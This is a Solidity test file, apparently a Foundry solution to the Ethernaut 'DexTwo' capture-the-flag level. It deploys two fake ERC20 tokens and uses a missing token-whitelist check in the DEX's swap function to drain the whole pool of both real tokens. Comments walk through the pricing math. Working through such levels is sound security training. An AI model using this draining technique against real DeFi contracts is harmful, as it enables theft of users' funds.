// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/DexTwo.sol";
import "src/levels/DexTwoFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDexTwo is BaseTest {
    DexTwo private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = DexTwo(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // The challenge seems to be similar to the old one but we need to drain both token1 and token2
        // The hints on the website are suggesting us to see how the `swap` function has changed.
        // If we compare the DexTwo contract with Dex we see that there is a require missing from the old code
        // `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
        // This require was pretty important because it was a check to be sure that both token1 and token2 where
        // token whitelisted and approved by the Dex
        // What would happen if we try to swap tokens that have not been whitelisted and the liquidity is pretty low?

        // Deploy a fake token based on the SwappableTokenTwo contract
        // Mint 10k tokens and send them to the player (msg.sender)
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), "Fake Token 1", "FKT1", 10_000);
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), "Fake Token 1", "FKT1", 10_000);

        // Are we able to drain the token1 in just one call?
        // In order to do so we need to find the correct amount of fakeToken to sell to get back 100 token1
        // 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken
        // 100 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken
        // Now we have two variables that we can control. We know for sure that DexBalanceOfFakeToken must be > 1
        // Otherwise it will revert because of division by 0
        // So if we send 1 FakeToken to DexTwo we would have
        // 100 = amountOfFakeTokenToSell * 100 / 1
        // 1 = amountOfFakeTokenToSell
        // Repeat the same thing with another FakeToken to drain token2 and we are all set!

        // Approve the dex to manage all of our token
        token1.approve(address(level), 2**256 - 1);
        token2.approve(address(level), 2**256 - 1);
        fakeToken1.approve(address(level), 2**256 - 1);
        fakeToken2.approve(address(level), 2**256 - 1);

        // send 1 fake token to the DexTwo to have at least 1 of liquidity
        ERC20(fakeToken1).transfer(address(level), 1);
        ERC20(fakeToken2).transfer(address(level), 1);

        // Swap 100 fakeToken1 to get 100 token1
        level.swap(address(fakeToken1), address(token1), 1);
        level.swap(address(fakeToken2), address(token2), 1);

        assertEq(token1.balanceOf(address(level)) == 0 && token2.balanceOf(address(level)) == 0, true);

        vm.stopPrank();
    }
}
